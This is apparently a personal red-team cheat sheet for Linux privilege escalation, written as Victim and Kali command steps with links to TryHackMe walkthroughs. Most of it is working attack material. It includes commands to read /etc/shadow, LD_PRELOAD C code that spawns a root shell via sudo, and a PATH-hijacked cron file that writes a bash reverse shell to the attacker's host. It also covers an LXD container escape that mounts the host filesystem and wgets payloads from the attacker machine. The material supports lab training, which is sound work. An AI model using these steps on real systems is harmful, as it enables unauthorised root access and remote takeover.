# Linux

## **Gathering Info**

```
whoami
```

```
uname -a
```

```
cat /etc/passwd
cat /etc/shadow
```

Check for passwords in environment variables

```
env
```

### Crontab

**Victim**

```
cat /etc/crontab
```

Possible other places crons are running

**Victim**

```
cat /etc/cron.d/*
```

## Sudo/SUID/Capabilities <a href="#user-content-sudosuidcapabilities" id="user-content-sudosuidcapabilities"></a>

Run all of these commands then check [https://gtfobins.github.io/](https://gtfobins.github.io/) . They may give different results

### **Check what can be run with NOPASSWD**

**Victim**

```
sudo -l
```



| Finding        | Comment | Examples |
| -------------- | ------- | -------- |
| fill out later |         |          |
|                |         |          |
|                |         |          |

### **LD\_PRELOAD**

**Examples**

[road.md](../../../../walkthroughs/tryhackme/road.md "mention")

If LD\_PRELOAD is set try below then running the script we can run with NOPASSWD

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
vi preload.c
```

**preload.c - code**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/bash");
}
```

**Victim**

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so $NOPASSWD_SCRIPT_WE_CAN_ABUSE
```



### **Files with SUID-bit set**

**Victim**

```
find / -perm -u=s -type f 2> /dev/null 
```

| Finding                       | Comments                                                                                                            | Examples                                                                                                                                                                                                                                                                                                     |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| setcap                        | If setcap is set that is very interesting checkout room. Could lead to priv esc. by setting getcap on other things. | [annie.md](../../../../walkthroughs/tryhackme/annie.md "mention")                                                                                                                                                                                                                                            |
| Programs in strange locations | If there is a program running in a user home directory or somewhere strange, it may be worth investigating          | <p><a data-mention href="../../../../walkthroughs/tryhackme/common-linux-privesc.md">common-linux-privesc.md</a><a data-mention href="../../../../walkthroughs/tryhackme/madeyes-castle/">madeyes-castle</a> <br><a data-mention href="../../../../walkthroughs/tryhackme/containme.md">containme.md</a></p> |
| find                          | Can spawn shell                                                                                                     | [boiler-ctf.md](../../../../walkthroughs/tryhackme/boiler-ctf.md "mention")                                                                                                                                                                                                                                  |
| doas                          | Can read files or copy files                                                                                        | [glitch.md](../../../../walkthroughs/tryhackme/glitch.md "mention")                                                                                                                                                                                                                                          |
| strings                       | Can read files                                                                                                      | [jack-of-all-trades.md](../../../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")                                                                                                                                                                                                                  |
| cputils                       | Can copy files                                                                                                      | [olympus.md](../../../../walkthroughs/tryhackme/olympus.md "mention")                                                                                                                                                                                                                                        |

### Getcap

**Victim**

```
getcap -r / 2>/dev/null
```

| Finding | Comments                                                                                                                                                                                                             | Examples                                                                                                    |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| python  | If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID. | [oh-my-webserver.md](../../../../walkthroughs/tryhackme/oh-my-webserver.md "mention")                       |
| vim     | Can spawn shell                                                                                                                                                                                                      | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
| perl    | Can spawn shell                                                                                                                                                                                                      | [wonderland.md](../../../../walkthroughs/tryhackme/wonderland.md "mention")                                 |
| openssl | Can spawn shell                                                                                                                                                                                                      | [mindgames.md](../../../../walkthroughs/tryhackme/mindgames.md "mention")                                   |



## PATH Variables

**Examples**

[hacker-vs.-hacker.md](../../../../walkthroughs/tryhackme/hacker-vs.-hacker.md "mention")

Look at the paths, below is an example of a cronjob. it first looks at /home/lachlan/bin before /bin and /usr/bin. therefore we can change pkill because it doesn't use the exact path in the cronjob. This means we can put a new file called /home/lachlan/bin/pkill with whatever we want and it will run as root.

**Victim**

```
cat /etc/crontab
```

Possible other places crons are running

**Victim**

```
cat /etc/cron.d/*
```

<figure><img src="../../../../.gitbook/assets/image (774).png" alt=""><figcaption></figcaption></figure>

**Victim(lachlan)**

```
echo "bash -c 'bash -i >& /dev/tcp/$KALI/1338 0>&1'" > /home/lachlan/bin/pkill ; chmod  +x bin/pkill
```



**Kali**

## Writable Files

**Files where group permissions equal to "writable"**

```
find / -type f -perm /g=w -exec ls -l {} + 2> /dev/null 
```

```
ps aux | grep -v "\[" | grep root
```

```
dpkg -l # debian
```

```
rpm -qa # red hat
```

```
pacman -Qe # arch linux
```

## **Ports**

May be able to find open ports only accessible internally.&#x20;

```
ss -ltp
```



### LXD&#x20;

**Examples**

[anonymous.md](../../../../walkthroughs/tryhackme/anonymous.md "mention")[gamingserver.md](../../../../walkthroughs/tryhackme/gamingserver.md "mention")

**Resources**

[https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)

**Victim**

```
id
```

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python2 -m SimpleHTTPServer 81
```

**Note:** The command lxd init was to resolve a storage pool area issue, it may not always be needed.

**Victim**

```
cd /tmp
wget http://$KALI:81/alpine-v3.18-x86_64-20231111_1929.tar.gz
lxc image import ./alpine-v3.18-x86_64-20231111_1929.tar.gz --alias myimage
lxd init
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```



## PolKit

**Examples:** [hip-flask.md](../../../../walkthroughs/tryhackme/hip-flask.md "mention")

See if it exists.

**Kali**

```
apt list --upgradeable
```

<figure><img src="../../../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

Check out this room for more details

{% embed url="https://tryhackme.com/r/room/polkit" %}

##

## Monitor Processes

### PSPY

script that can monitor linux processes without root access

**Kali**

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 
python2 -m SimpleHTTPServer 81
```

**Victim**

```
wget http://$KALI:81/pspy32 
chmod +x pspy32 
./pspy32 
```





## Docker Breakout / Privilege Escalation

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation" %}

**Examples**

[ultratech.md](../../../../walkthroughs/tryhackme/ultratech.md "mention")

[dogcat.md](../../../../walkthroughs/tryhackme/dogcat.md "mention")

[the-marketplace.md](../../../../walkthroughs/tryhackme/the-marketplace.md "mention")



Copy Material from here:

[https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)



## **Automated Enumeration Tools**

| Name                          | Link                                                                                                                                                                                           |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| LinPeas                       | [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) |
| LinEnum                       | [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)                                                                                                                 |
| LES (Linux Exploit Suggester) | [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)                                                                                           |
| Linux Smart Enumeration       | [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)                                                                           |
| Linux Priv Checker:           | [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)                                                                                                       |



## Room with other things to try

[https://jeffgthompsons-organization.gitbook.io/red-team/walkthroughs/tryhackme/linux-privesc](https://jeffgthompsons-organization.gitbook.io/red-team/walkthroughs/tryhackme/linux-privesc)

## Other Cheat sheets

[https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)

